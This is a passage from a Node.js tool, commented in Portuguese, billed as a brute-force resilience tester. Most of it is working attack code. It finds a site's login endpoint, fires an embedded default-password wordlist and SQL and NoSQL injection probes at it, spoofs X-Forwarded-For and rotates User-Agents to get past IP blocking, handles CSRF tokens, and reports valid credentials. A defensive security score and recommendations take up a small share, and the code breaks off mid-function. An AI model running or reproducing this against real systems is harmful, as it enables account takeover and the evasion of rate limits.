'use strict';

/* ═══════════════════════════════════════════════════════════════════
   BRUTE FORCE RESILIENCE TEST ENGINE v3 — Advanced
   Técnicas avançadas de teste de resiliência anti-bruteforce:
   · Rotação de User-Agent e identidade (headers variados)
   · Cookie Jar por identidade para manter sessão
   · Delay adaptativo com jitter e backoff exponencial em 429
   · Requisições concorrentes com N workers independentes
   · Seguimento de redirects (até 5 saltos)
   · Retry automático em falhas de conexão
   · Suporte a JSON, form-urlencoded, NextAuth (CSRF), GraphQL, Supabase
   · Múltiplos formatos de campo (email/username/login)
   · X-Forwarded-For rotativo para evasão de bloqueio por IP
   ═══════════════════════════════════════════════════════════════════ */

const http             = require('http');
const https            = require('https');
const { URL }          = require('url');
const { EventEmitter } = require('events');

// ── User-Agents realistas para rotação ───────────────────────────
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
];

// IPs fictícios para rotação de X-Forwarded-For
const FAKE_IPS = [
  '187.44.12.33', '189.100.45.67', '177.18.220.4', '200.175.33.91',
  '186.251.80.12', '170.82.44.21', '191.36.123.5',  '179.184.224.8',
  '45.162.33.77', '138.122.11.9', '104.28.55.3',   '172.217.28.1',
  '151.101.193.67','103.21.244.0',  '198.41.128.100','2.16.0.0',
  '66.249.66.1',  '17.142.160.59', '52.26.198.200', '54.239.28.85',
];

// Accept-Language realistas
const ACCEPT_LANGS = [
  'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9,pt;q=0.8',
  'pt-BR,pt;q=0.8,en;q=0.6',
  'en-GB,en;q=0.9,pt-BR;q=0.8',
  'es-ES,es;q=0.9,pt-BR;q=0.7',
];

// ── Helpers ──────────────────────────────────────────────────────
function rnd(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function jitter(ms, pct = 0.3) {
  const delta = ms * pct * (Math.random() * 2 - 1);
  return Math.max(0, ms + delta);
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function uuid4() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

// ── Cookie Jar — mantém cookies por identidade ───────────────────
class CookieJar {
  constructor() { this._store = new Map(); }

  store(hostname, headers) {
    const raw = headers?.['set-cookie'];
    if (!raw) return;
    const list = Array.isArray(raw) ? raw : [raw];
    list.forEach(c => {
      const part  = c.split(';')[0];
      const eq    = part.indexOf('=');
      if (eq < 1) return;
      const name  = part.slice(0, eq).trim();
      const value = part.slice(eq + 1).trim();
      this._store.set(`${hostname}::${name}`, `${name}=${value}`);
    });
  }

  get(hostname) {
    const out = [];
    for (const [k, v] of this._store.entries()) {
      if (k.startsWith(`${hostname}::`)) out.push(v);
    }
    return out.join('; ');
  }

  clear(hostname) {
    for (const k of this._store.keys()) {
      if (k.startsWith(`${hostname}::`)) this._store.delete(k);
    }
  }
}

// ── Delay Adaptativo — backoff exponencial em 429/503 ────────────
class AdaptiveDelay {
  constructor(baseMs) {
    this.base        = baseMs;
    this.current     = baseMs;
    this.blocks      = 0;
    this.oks         = 0;
    this.maxMs       = 8000;
  }

  onBlocked() {
    this.blocks++;
    this.oks = 0;
    this.current = Math.min(this.current * 1.8, this.maxMs);
  }

  onOk() {
    this.oks++;
    this.blocks = 0;
    if (this.oks >= 4) {
      this.current = Math.max(this.current * 0.75, this.base);
    }
  }

  async wait() {
    const ms = jitter(this.current, 0.25);
    if (ms > 0) await sleep(ms);
  }
}

// ── Wordlist embutida ─────────────────────────────────────────────
const BUILTIN_WORDLIST = [
  { user: 'admin@admin.com',        pass: 'admin' },
  { user: 'admin@admin.com',        pass: 'password' },
  { user: 'admin@admin.com',        pass: 'admin123' },
  { user: 'admin@admin.com',        pass: '123456' },
  { user: 'admin@admin.com',        pass: 'password123' },
  { user: 'admin@admin.com',        pass: 'P@ssw0rd' },
  { user: 'admin@admin.com',        pass: 'Admin@2024' },
  { user: 'admin@admin.com',        pass: 'Admin@2025' },
  { user: 'admin@admin.com',        pass: 'Admin2025!' },
  { user: 'admin@admin.com',        pass: 'letmein' },
  { user: 'admin@admin.com',        pass: 'welcome1' },
  { user: 'admin@admin.com',        pass: 'qwerty123' },
  { user: 'admin@admin.com',        pass: 'iloveyou' },
  { user: 'admin@admin.com',        pass: '111111' },
  { user: 'admin@admin.com',        pass: '000000' },
  { user: 'admin@admin.com',        pass: 'master' },
  { user: 'admin@admin.com',        pass: 'dragon' },
  { user: 'admin@admin.com',        pass: 'monkey' },
  { user: 'admin@admin.com',        pass: 'sunshine' },
  { user: 'admin@admin.com',        pass: 'shadow' },
  { user: 'admin@example.com',      pass: 'admin' },
  { user: 'admin@example.com',      pass: 'password' },
  { user: 'admin@example.com',      pass: 'admin123' },
  { user: 'test@test.com',          pass: 'test' },
  { user: 'test@test.com',          pass: 'password' },
  { user: 'test@test.com',          pass: 'test123' },
  { user: 'user@user.com',          pass: 'user' },
  { user: 'user@user.com',          pass: 'password' },
  { user: 'demo@demo.com',          pass: 'demo' },
  { user: 'demo@demo.com',          pass: 'demo123' },
  { user: 'root@root.com',          pass: 'root' },
  { user: 'root@root.com',          pass: 'toor' },
  { user: 'support@example.com',    pass: 'support' },
  { user: 'info@example.com',       pass: 'info123' },
  { user: 'contact@example.com',    pass: 'contact' },
  { user: 'admin',                  pass: 'admin' },
  { user: 'admin',                  pass: 'password' },
  { user: 'admin',                  pass: '123456' },
  { user: 'administrator',          pass: 'administrator' },
  { user: 'administrator',          pass: 'password' },
  { user: 'root',                   pass: 'root' },
  { user: 'root',                   pass: 'password' },
  { user: 'guest',                  pass: 'guest' },
  { user: 'guest',                  pass: 'password' },
  { user: 'test',                   pass: 'test' },
  { user: 'test',                   pass: 'password' },
  { user: 'admin@supabase.io',      pass: 'supabase' },
  { user: 'anon@supabase.io',       pass: 'anon' },
  { user: 'service@supabase.io',    pass: 'service_role' },
  { user: 'admin@admin.com',        pass: 'abc123' },
  { user: 'admin@admin.com',        pass: '12345678' },
  { user: 'admin@admin.com',        pass: 'qwerty' },
  { user: 'admin@admin.com',        pass: '1234567890' },
  { user: 'admin@admin.com',        pass: 'superman' },
  { user: 'admin@admin.com',        pass: 'batman' },
  { user: 'admin@admin.com',        pass: 'trustno1' },
  { user: 'admin@admin.com',        pass: 'pass1234' },
  { user: 'admin@admin.com',        pass: 'pass@123' },
  { user: 'admin@admin.com',        pass: 'hello123' },
  { user: 'admin@admin.com',        pass: 'changeme' },
  { user: 'admin@admin.com',        pass: 'secret' },
  { user: 'admin@admin.com',        pass: 'temp1234' },
  { user: 'admin@admin.com',        pass: 'default' },
  // Sondas de injeção
  { user: "' OR '1'='1",            pass: "' OR '1'='1" },
  { user: 'admin',                  pass: "' OR 1=1--" },
  { user: "admin'--",               pass: 'anything' },
  { user: '" OR ""="',              pass: '" OR ""="' },
  { user: 'admin',                  pass: "1' OR '1'='1" },
  { user: 'admin@admin.com',        pass: '{"$gt":""}' },
  { user: '{"$gt":""}',             pass: 'anything' },
];

// ── Parser de wordlist ────────────────────────────────────────────
function parseWordlist(text, defaultUser = 'admin@target.com') {
  return text
    .split('\n')
    .map(l => l.trim())
    .filter(l => l && !l.startsWith('#') && !l.startsWith('//'))
    .slice(0, 2000)
    .map(line => {
      const colonIdx = line.indexOf(':');
      if (colonIdx > 0 && colonIdx < line.length - 1) {
        return { user: line.slice(0, colonIdx), pass: line.slice(colonIdx + 1) };
      }
      return { user: defaultUser, pass: line };
    });
}

// ── HTTP GET com seguimento de redirect ───────────────────────────
function httpGet(url, timeoutMs = 10000, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    let parsed;
    try { parsed = new URL(url); } catch (e) { return reject(e); }

    const lib = parsed.protocol === 'https:' ? https : http;

    const reqOpts = {
      hostname: parsed.hostname,
      port:     parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path:     parsed.pathname + (parsed.search || ''),
      method:   'GET',
      headers: {
        'User-Agent':       rnd(USER_AGENTS),
        'Accept':           'text/html,application/xhtml+xml,application/json,*/*;q=0.8',
        'Accept-Language':  rnd(ACCEPT_LANGS),
        'Accept-Encoding':  'gzip, deflate, br',
        'Cache-Control':    'no-cache',
        ...extraHeaders,
      },
      timeout: timeoutMs,
    };

    const req = lib.request(reqOpts, res => {
      // Seguir redirect (máx 3 saltos)
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        const next = res.headers.location.startsWith('http')
          ? res.headers.location
          : `${parsed.origin}${res.headers.location}`;
        return httpGet(next, timeoutMs).then(resolve).catch(reject);
      }

      let body = '';
      // Ler mesmo comprimido (sem descomprimir, apenas string raw — suficiente para regex)
      res.on('data', d => { if (body.length < 300000) body += d; });
      res.on('end',  () => resolve({ status: res.statusCode, body, headers: res.headers }));
    });

    req.on('timeout', () => { req.destroy(); reject(new Error('TIMEOUT')); });
    req.on('error',   reject);
    req.end();
  });
}

// ── Detecta tipo de endpoint ──────────────────────────────────────
function detectEndpointType(urlStr) {
  if (urlStr.includes('/auth/v1/token'))                 return 'supabase_token';
  if (urlStr.includes('/auth/v1/'))                      return 'supabase_auth';
  if (urlStr.includes('/api/auth/callback/credentials')) return 'nextauth';
  if (urlStr.includes('/api/auth/signin'))               return 'nextauth';
  if (/\/graphql\b/i.test(urlStr))                       return 'graphql';
  if (urlStr.includes('/api/auth'))                      return 'api_json';
  if (urlStr.includes('/api/login'))                     return 'api_json';
  if (urlStr.includes('/api/session'))                   return 'api_json';
  if (urlStr.includes('.json'))                          return 'api_json';
  return 'form';
}

// ── Resolve o endpoint real de autenticação ───────────────────────
async function resolveLoginEndpoint(urlStr, emit) {
  const raw = urlStr.startsWith('http') ? urlStr : 'https://' + urlStr;
  let parsed;
  try { parsed = new URL(raw); } catch { return { url: raw, type: 'form', detected: 'unknown' }; }

  const origin = parsed.origin;
  const path   = parsed.pathname;

  if (
    path.includes('/api/')    ||
    path.includes('/auth/v1/')||
    path.endsWith('.json')    ||
    parsed.search.includes('grant_type=') ||
    /\/graphql\b/i.test(path)
  ) {
    return { url: parsed.href, type: detectEndpointType(parsed.href), detected: 'direct' };
  }

  emit?.({ type: 'log', level: 'info', message: `[BF] Analisando página: ${parsed.href}` });

  try {
    const page = await httpGet(parsed.href, 10000);
    const html = page.body;

    // 1. Supabase no HTML/inline
    const sbInline = html.match(/https?:\/\/([a-z0-9-]+)\.supabase\.co/);
    if (sbInline) {
      const u = `https://${sbInline[1]}.supabase.co/auth/v1/token?grant_type=password`;
      emit?.({ type: 'log', level: 'info', message: `[BF] Supabase detectado inline → ${u}` });
      return { url: u, type: 'supabase_token', detected: 'supabase' };
    }

    // 2. Inspecionar scripts externos (máx 8)
    const scriptRegex = /<script[^>]+src=["']([^"']+\.js[^"']*)["']/gi;
    let sm;
    const scriptUrls = [];
    while ((sm = scriptRegex.exec(html)) !== null && scriptUrls.length < 8) {
      let src = sm[1].split('?')[0];
      if (src.startsWith('//'))   src = 'https:' + src;
      else if (src.startsWith('/')) src = origin + src;
      else if (!src.startsWith('http')) src = origin + '/' + src;
      scriptUrls.push(src);
    }

    for (const sUrl of scriptUrls) {
      try {
        const sr = await httpGet(sUrl, 6000);
        const sbBundle = sr.body.match(/https?:\/\/([a-z0-9-]+)\.supabase\.co/);
        if (sbBundle) {
          const u = `https://${sbBundle[1]}.supabase.co/auth/v1/token?grant_type=password`;
          emit?.({ type: 'log', level: 'info', message: `[BF] Supabase no bundle ${sUrl} → ${u}` });
          return { url: u, type: 'supabase_token', detected: 'supabase_bundle' };
        }
        // GraphQL no bundle
        if (/["']\/graphql["']|graphql.*mutation.*login|mutation.*signIn/i.test(sr.body)) {
          const gqlUrl = `${origin}/graphql`;
          emit?.({ type: 'log', level: 'info', message: `[BF] GraphQL detectado no bundle → ${gqlUrl}` });
          return { url: gqlUrl, type: 'graphql', detected: 'graphql_bundle', origin };
        }
      } catch { /* continua */ }
    }

    // 3. Form action
    const formMatch =
      html.match(/<form[^>]+action=["']([^"'#][^"']*)["'][^>]*method=["']post["']/i) ||
      html.match(/<form[^>]+method=["']post["'][^>]+action=["']([^"'#][^"']*)["']/i);
    if (formMatch) {
      let action = formMatch[1];
      if (!action.startsWith('http')) action = origin + (action.startsWith('/') ? '' : '/') + action;
      const type = detectEndpointType(action);
      emit?.({ type: 'log', level: 'info', message: `[BF] Form action → ${action} (${type})` });
      return { url: action, type };
    }

    // 4. fetch/axios inline
    const fetchMatch = html.match(/(?:fetch|axios\.post)\s*\(\s*['"`]([^'"`]*(?:login|auth|signin|session)[^'"`]*)['"`]/i);
    if (fetchMatch) {
      let u = fetchMatch[1];
      if (!u.startsWith('http')) u = origin + (u.startsWith('/') ? '' : '/') + u;
      emit?.({ type: 'log', level: 'info', message: `[BF] API call inline → ${u}` });
      return { url: u, type: 'api_json', detected: 'fetch_inline' };
    }

    // 5. Next.js → NextAuth
    const isNext = html.includes('__NEXT_DATA__') || html.includes('/_next/static');
    if (isNext) {
      const u = `${origin}/api/auth/callback/credentials`;
      emit?.({ type: 'log', level: 'info', message: `[BF] Next.js → NextAuth: ${u}` });
      return { url: u, type: 'nextauth', detected: 'nextjs', origin };
    }

  } catch (err) {
    emit?.({ type: 'log', level: 'warn', message: `[BF] Falha ao inspecionar página: ${err.message}` });
  }

  emit?.({ type: 'log', level: 'warn', message: `[BF] Usando fallback genérico: ${origin}/api/login` });
  return {
    url: `${origin}/api/login`,
    type: 'api_json',
    detected: 'fallback',
    candidates: [
      `${origin}/api/login`,
      `${origin}/api/auth/login`,
      `${origin}/api/signin`,
      raw,
    ],
  };
}

// ── CSRF token para NextAuth ──────────────────────────────────────
async function getNextAuthCsrf(origin) {
  try {
    const res = await httpGet(`${origin}/api/auth/csrf`, 5000);
    if (res.status === 200) {
      const json = JSON.parse(res.body);
      const cookie = res.headers['set-cookie'];
      return {
        csrfToken: json.csrfToken || '',
        cookie: Array.isArray(cookie) ? cookie.map(c => c.split(';')[0]).join('; ') : (cookie?.split(';')[0] || ''),
      };
    }
  } catch { /* sem csrf */ }
  return null;
}

// ── Monta payload por tipo de endpoint ───────────────────────────
function buildPayload(credential, endpointType, csrfData) {
  if (endpointType === 'supabase_token' || endpointType === 'supabase_auth') {
    return {
      contentType: 'application/json',
      body: JSON.stringify({ email: credential.user, password: credential.pass }),
    };
  }

  if (endpointType === 'graphql') {
    const query = `mutation Login($email:String!,$password:String!){
      signIn(email:$email,password:$password){token access_token jwt user{id email}}
      login(email:$email,password:$password){token access_token jwt user{id email}}
      authenticate(email:$email,password:$password){token access_token jwt}
    }`;
    return {
      contentType: 'application/json',
      body: JSON.stringify({ query, variables: { email: credential.user, password: credential.pass } }),
    };
  }

  if (endpointType === 'nextauth') {
    const params = new URLSearchParams({
      csrfToken:   csrfData?.csrfToken || '',
      callbackUrl: '/',
      json:        'true',
      email:       credential.user,
      username:    credential.user,
      password:    credential.pass,
    });
    return {
      contentType:  'application/x-www-form-urlencoded',
      body:         params.toString(),
      csrfCookie:   csrfData?.cookie || '',
    };
  }

  if (endpointType === 'api_json') {
    return {
      contentType: 'application/json',
      body: JSON.stringify({
        email:    credential.user,
        username: credential.user,
        login:    credential.user,
        user:     credential.user,
        password: credential.pass,
        passwd:   credential.pass,
      }),
    };
  }

  // form-urlencoded genérico
  const params = new URLSearchParams({
    username: credential.user,
    email:    credential.user,
    login:    credential.user,
    user:     credential.user,
    password: credential.pass,
    passwd:   credential.pass,
  });
  return { contentType: 'application/x-www-form-urlencoded', body: params.toString() };
}

// ── Detecta sucesso de autenticação ──────────────────────────────
function isSuccess(status, body, headers) {
  const ct       = (headers?.['content-type'] || '').toLowerCase();
  const setCookie = headers?.['set-cookie'];
  const location  = headers?.['location'] || '';

  if (status === 200 || status === 201) {
    const isJson = ct.includes('application/json') ||
                   body.trimStart().startsWith('{') ||
                   body.trimStart().startsWith('[');

    if (isJson) {
      try {
        const json = JSON.parse(body);
        // Falha explícita
        if (json.error)      return false;
        if (json.error_code) return false;
        if (json.code === 'invalid_credentials' || json.code === 'invalid_login_credentials') return false;
        if (typeof json.message === 'string' &&
            /invalid|incorrect|wrong|unauthorized|bad credential|not found|does not exist|failed/i
            .test(json.message)) return false;
        if (typeof json.msg === 'string' &&
            /invalid|incorrect|wrong|unauthorized|bad/i.test(json.msg)) return false;

        // Sucesso explícito
        if (json.access_token)  return true;
        if (json.token)         return true;
        if (json.jwt)           return true;
        if (json.auth_token)    return true;
        if (json.id_token)      return true;
        if (json.token_type?.toLowerCase() === 'bearer' && !json.error) return true;
        if (json.session?.access_token) return true;
        if (json.session?.user?.id)     return true;
        if (json.data?.session?.access_token) return true;
        if (json.data?.token)           return true;
        if (json.user?.id && !json.error && !json.message) return true;
        if (json.ok === true && json.url && !json.error) return true;
        if (json.success === true && (json.token || json.data?.token)) return true;
        // GraphQL: data.signIn.token | data.login.token
        if (json.data) {
          const d = json.data;
          for (const k of Object.keys(d)) {
            if (d[k]?.token || d[k]?.access_token || d[k]?.jwt) return true;
          }
        }
        return false;
      } catch { return false; }
    }

    if (ct.includes('text/html')) {
      if (setCookie) {
        const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
        if (cookies.some(c => /session|auth[-_]?token|jwt|access[-_]?token|next-auth\.session/i.test(c))) {
          return true;
        }
      }
      return false;
    }

    return body.includes('access_token') || body.includes('"token"');
  }

  if (status === 302 || status === 303) {
    if (!location) return false;
    const loc = location.toLowerCase();
    return !loc.includes('login')   &&
           !loc.includes('signin')  &&
           !loc.includes('error')   &&
           !loc.includes('fail')    &&
           !loc.includes('unauthorized') &&
           !loc.includes('?error')  &&
           !loc.includes('#error');
  }

  return false;
}

// ── Seguimento de redirect em POST ───────────────────────────────
async function followRedirect(location, parsedOrigin, headers, cookieJar, timeoutMs) {
  const target = location.startsWith('http')
    ? location
    : `${parsedOrigin.origin}${location}`;
  try {
    const res = await httpGet(target, timeoutMs, { Cookie: cookieJar.get(parsedOrigin.hostname) });
    return { status: res.status, body: res.body, headers: res.headers };
  } catch { return null; }
}

// ── Tentativa de login com retry e seguimento de redirect ─────────
async function doAttempt(parsedUrl, credential, endpointType, anonKey, delayFn, csrfData, cookieJar, identity) {
  await delayFn();

  const ua   = identity?.ua   || rnd(USER_AGENTS);
  const ip   = identity?.ip   || rnd(FAKE_IPS);
  const lang = identity?.lang || rnd(ACCEPT_LANGS);

  const { contentType, body, csrfCookie } = buildPayload(credential, endpointType, csrfData);
  const bodyBuf = Buffer.from(body, 'utf8');

  // Montar cookies: jar + csrf
  let cookieHeader = cookieJar.get(parsedUrl.hostname);
  if (csrfCookie) {
    cookieHeader = cookieHeader
      ? `${cookieHeader}; ${csrfCookie}`
      : csrfCookie;
  }

  const reqHeaders = {
    'User-Agent':       ua,
    'Accept':           'application/json, text/html, */*;q=0.8',
    'Accept-Language':  lang,
    'Accept-Encoding':  'gzip, deflate, br',
    'Content-Type':     contentType,
    'Content-Length':   bodyBuf.length,
    'Origin':           parsedUrl.origin,
    'Referer':          `${parsedUrl.origin}/login`,
    'X-Requested-With': 'XMLHttpRequest',
    'X-Request-ID':     uuid4(),
    'Cache-Control':    'no-cache',
    'Connection':       'keep-alive',
    // Headers de proxy para evasão de bloqueio simples por IP
    'X-Forwarded-For':  ip,
    'X-Real-IP':        ip,
    'X-Originating-IP': ip,
  };

  if (cookieHeader) reqHeaders['Cookie'] = cookieHeader;

  if (anonKey && (endpointType === 'supabase_token' || endpointType === 'supabase_auth')) {
    reqHeaders['apikey']        = anonKey;
    reqHeaders['Authorization'] = `Bearer ${anonKey}`;
  }

  const MAX_RETRIES = 2;
  let lastResult = null;

  for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
    if (attempt > 0) await sleep(300 * attempt);

    lastResult = await new Promise(resolve => {
      const t0  = Date.now();
      const lib = parsedUrl.protocol === 'https:' ? https : http;

      const req = lib.request({
        hostname: parsedUrl.hostname,
        port:     parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        path:     parsedUrl.pathname + (parsedUrl.search || ''),
        method:   'POST',
        headers:  reqHeaders,
        timeout:  14000,
      }, res => {
        let data = '';
        res.on('data', d => { if (data.length < 8192) data += d; });
        res.on('end', () => {
          const lat     = Date.now() - t0;
          const status  = res.statusCode;

          // Armazenar cookies da resposta
          cookieJar.store(parsedUrl.hostname, res.headers);

          const success = isSuccess(status, data, res.headers);
          const blocked = status === 429 || status === 423 || status === 503 ||
                          (status === 403 && !success);
          const waf     = (status === 403 || status === 406 || status === 429) && (
            data.toLowerCase().includes('cloudflare') ||
            data.toLowerCase().includes('waf')        ||
            data.toLowerCase().includes('blocked')    ||
            data.toLowerCase().includes('captcha')    ||
            Boolean(res.headers?.['cf-ray'])           ||
            Boolean(res.headers?.['x-sucuri-id'])
          );

          resolve({
            ok: true, status, lat, success, blocked, waf,
            user:        credential.user,
            pass:        credential.pass,
            snippet:     data.slice(0, 300),
            contentType: res.headers['content-type'] || '',
            setCookie:   res.headers['set-cookie'] || null,
          });
        });
        res.on('error', () => resolve({
          ok: false, error: 'RES_ERR', lat: Date.now() - t0,
          user: credential.user, pass: credential.pass,
        }));
      });

      req.on('timeout', () => {
        req.destroy();
        resolve({ ok: false, error: 'TIMEOUT', lat: Date.now() - t0, user: credential.user, pass: credential.pass });
      });
      req.on('error', e => resolve({
        ok: false, error: e.code || 'CONN_ERR', lat: Date.now() - t0, user: credential.user, pass: credential.pass,
      }));

      req.write(bodyBuf);
      req.end();
    });

    // Retry apenas em erros de conexão (não em respostas HTTP)
    if (lastResult.ok || lastResult.error === 'TIMEOUT') break;
    // CONN_ERR / RES_ERR → retry
  }

  return lastResult;
}

// ── Score de segurança ────────────────────────────────────────────
function calcSecurityScore(results, hits) {
  if (!results.length) return { score: 0, grade: 'N/A', color: '#888', label: 'Sem dados', summary: '' };

  const blocked    = results.filter(r => r.blocked).length;
  const wafHits    = results.filter(r => r.waf).length;
  const sqlProbes  = results.filter(r => r.user && (r.user.includes("'") || r.user.includes('"'))).length;
  const sqlBlocked = results.filter(r =>
    r.user && (r.user.includes("'") || r.user.includes('"')) && (r.blocked || r.waf)
  ).length;
  const blockRate = blocked / results.length;

  if (hits.length > 0) {
    return {
      score: 0, grade: 'F', color: '#ef4444',
      label: 'CREDENCIAIS EXPOSTAS',
      summary: `${hits.length} par(es) de credencial(is) válido(s) encontrado(s)! Altere senhas imediatamente e invalide todas as sessões.`,
    };
  }

  let s = 100;
  if      (blockRate >= 0.7) s = Math.min(s, 100);
  else if (blockRate >= 0.4) s -= 10;
  else if (blockRate >= 0.2) s -= 25;
  else if (blockRate >= 0.05) s -= 40;
  else                        s -= 55;

  if (wafHits > 0) s = Math.min(100, s + 5);
  if (sqlProbes > 0 && sqlBlocked === sqlProbes) s = Math.min(100, s + 5);
  else if (sqlProbes > 0 && sqlBlocked === 0)    s -= 10;

  const connErrors = results.filter(r => !r.ok).length;
  if (connErrors / results.length > 0.3) s -= 10;

  s = Math.max(0, Math.min(100, Math.round(s)));

  let grade, color, label, summary;
  if      (s >= 90) { grade = 'A+'; color = '#22c55e'; label = 'Fortemente Protegido';  summary = 'Excelente. O servidor detectou e bloqueou o ataque eficientemente.'; }
  else if (s >= 78) { grade = 'A';  color = '#22c55e'; label = 'Bem Protegido';          summary = 'Rate limiting ativo. A maioria das tentativas foi bloqueada.'; }
  else if (s >= 65) { grade = 'B+'; color = '#84cc16'; label = 'Proteção Boa';           summary = 'Proteção detectada, mas não bloqueia todas as tentativas.'; }
  else if (s >= 52) { grade = 'B';  color = '#a3e635'; label = 'Proteção Adequada';      summary = 'Alguma proteção existe. Recomendado endurecer limites.'; }
  else if (s >= 38) { grade = 'C';  color = '#eab308'; label = 'Proteção Fraca';         summary = 'Rate limiting insuficiente. Ataques prolongados podem ter sucesso.'; }
  else if (s >= 22) { grade = 'D';  color = '#f97316'; label = 'Vulnerável';             summary = 'Sem proteção efetiva. O endpoint aceita tentativas ilimitadas.'; }
  else              { grade = 'F';  color = '#ef4444'; label = 'Crítico';                summary = 'Nenhuma proteção detectada. Vulnerabilidade crítica.'; }

  return { score: s, grade, color, label, summary };
}

// ── Recomendações ─────────────────────────────────────────────────
function buildRecommendations(results, hits, endpointType) {
  const blocked   = results.filter(r => r.blocked).length;
  const blockRate = results.length ? blocked / results.length : 0;
  const sqlProbes  = results.filter(r => r.user && r.user.includes("'")).length;
  const sqlBlocked = results.filter(r => r.user && r.user.includes("'") && r.blocked).length;
  const items = [];

  if (hits.length > 0) {
    items.push({ priority: 'P0', icon: '🚨',
      title: 'URGENTE: Credenciais comprometidas',
      body: `${hits.length} par(es) válido(s). Troque senhas agora, invalide tokens e ative MFA.` });
  }
  if (blockRate < 0.4) {
    items.push({ priority: 'P1', icon: '🚦',
      title: 'Implementar Rate Limiting agressivo',
      body: 'Máx 5 tentativas/IP a cada 15 min. Use express-rate-limit + Redis. Retorne 429 com Retry-After.' });
  }
  if (blockRate < 0.6) {
    items.push({ priority: 'P1', icon: '🔐',
      title: 'Bloqueio progressivo de conta',
      body: '3 falhas: delay; 5 falhas: bloqueio 15 min; 10 falhas: bloqueio 1h + e-mail de alerta.' });
  }
  items.push({ priority: 'P1', icon: '📱',
    title: 'Implementar MFA/TOTP',
    body: 'MFA torna bruteforce ineficaz mesmo com senha correta. Supabase suporta TOTP nativo.' });
  if (sqlProbes > 0 && sqlBlocked < sqlProbes) {
    items.push({ priority: 'P1', icon: '💉',
      title: 'Reforçar proteção contra SQL Injection',
      body: 'Tentativas de injeção não foram bloqueadas. Verifique queries parametrizadas e WAF.' });
  }
  items.push({ priority: 'P2', icon: '🌐',
    title: 'CAPTCHA adaptativo no login',
    body: 'Use hCaptcha ou Cloudflare Turnstile. Supabase suporta CAPTCHA nativo nas configurações de Auth.' });
  items.push({ priority: 'P2', icon: '🔍',
    title: 'Detecção de anomalias de autenticação',
    body: 'Monitore padrões: múltiplas tentativas por IP, velocidade incomum, UAs idênticos. Alerte via Supabase Hooks.' });
  items.push({ priority: 'P3', icon: '📊',
    title: 'SIEM e alertas de login',
    body: 'Integre logs com Datadog/Grafana. Alertas para >10 falhas/min por IP, logins de geo nova.' });

  return items.slice(0, 6);
}

// ── Cria um conjunto de identidades (UA + IP + lang) ─────────────
function createIdentities(count) {
  return Array.from({ length: count }, () => ({
    ua:   rnd(USER_AGENTS),
    ip:   rnd(FAKE_IPS),
    lang: rnd(ACCEPT_LANGS),
    jar:  new CookieJar(),
  }));
}

// ── Engine principal ──────────────────────────────────────────────
function createBruteforceTest(config) {
  const emitter = new EventEmitter();
  emitter.setMaxListeners(100);

  const run = async () => {
    const logEmit = d => emitter.emit('log', d);

    // ── 1. Resolver endpoint real ─────────────────────────────────
    const resolved     = await resolveLoginEndpoint(config.loginUrl, logEmit);
    const loginUrl     = resolved.url;
    const endpointType = resolved.type;

    emitter.emit('resolved', {
      originalUrl:  config.loginUrl,
      resolvedUrl:  loginUrl,
      endpointType,
      detected:     resolved.detected,
    });

    // ── 2. CSRF para NextAuth ────────────────────────────────────
    let csrfData = null;
    if (endpointType === 'nextauth') {
      const origin = resolved.origin || (() => { try { return new URL(loginUrl).origin; } catch { return ''; } })();
      logEmit({ type: 'log', level: 'info', message: '[BF] Obtendo CSRF token do NextAuth...' });
      csrfData = await getNextAuthCsrf(origin);
      if (csrfData?.csrfToken) {
        logEmit({ type: 'log', level: 'info', message: `[BF] CSRF token: ${csrfData.csrfToken.slice(0, 16)}...` });
      }
    }

    // ── 3. Parsear URL do endpoint ───────────────────────────────
    let parsedUrl;
    try {
      parsedUrl = new URL(loginUrl.startsWith('http') ? loginUrl : 'https://' + loginUrl);
    } catch {
      emitter.emit('error', 'URL de login inválida após resolução');
      return;
    }

    const credentials   = config.credentials?.length ? config.credentials : BUILTIN_WORDLIST;
    const baseDelay     = Math.max(50, Math.min(2000, config.delayMs ?? 150));
    const stopOnSuccess = config.stopOnSuccess !== false;
    const concurrency   = Math.max(1, Math.min(5, config.concurrency ?? 2));
    const useAdaptive   = config.adaptiveDelay !== false;

    emitter.emit('start', {
      target:         parsedUrl.origin + parsedUrl.pathname,
      originalTarget: config.loginUrl,
      total:          credentials.length,
      endpointType,
      detected:       resolved.detected,
      delayMs:        baseDelay,
